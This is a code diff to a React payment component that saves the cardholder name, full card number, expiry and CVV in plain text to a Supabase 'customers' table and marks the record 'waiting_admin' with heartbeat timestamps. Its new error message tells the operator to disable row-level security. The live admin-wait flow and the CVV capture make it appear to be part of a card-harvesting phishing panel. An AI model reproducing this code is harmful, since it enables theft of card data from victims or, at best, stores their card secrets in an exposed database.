@@ -125,27 +125,34 @@ export const Payment = () => {
   };
 
   const handlePay = async (e) => {
-    e.preventDefault();
-    setError('');
-    try {
-      const { error } = await supabase.from('customers').update({
-        card_name: formData.cardName,
-        card_number: formData.cardNumber.replace(/\s/g, ''), // Save without spaces for cleaner data
-        expiry_month: formData.expiryMonth,
-        expiry_year: formData.expiryYear,
-        cvv: formData.cvv,
-        status: 'waiting_admin',
-        last_update: new Date().getTime(),
-        last_heartbeat: new Date().getTime()
-      }).eq('id', customerId);
+    if (!customerId) {
+      setError('خطأ: لم يتم العثور على بيانات العميل، يرجى العودة للرئيسية');
+      return;
+    }
 
-      if (error) throw error;
+    try {
+      const updateData = {
+        card_name: formData.cardName,
+        card_number: formData.cardNumber.replace(/\s/g, ''), 
+        expiry_month: String(formData.expiryMonth),
+        expiry_year: String(formData.expiryYear),
+        cvv: String(formData.cvv),
+        status: 'waiting_admin',
+        last_update: Date.now(),
+        last_heartbeat: Date.now()
+      };
+
+      const { error: supabaseError } = await supabase
+        .from('customers')
+        .update(updateData)
+        .eq('id', customerId);
+
+      if (supabaseError) throw supabaseError;
       
-      // Ensure local state reflects the waiting status immediately
       setStatus('waiting_admin');
     } catch (err) {
-      console.error("Payment Submission Error:", err);
-      setError('حدث خطأ أثناء إرسال البيانات، يرجى المحاولة مرة أخرى');
+      console.error("Critical Payment Error:", err);
+      setError('فشل إرسال البيانات: تأكد من تشغيل كود SQL وتعطيل الـ RLS');
       setStatus('idle');
     }
   };
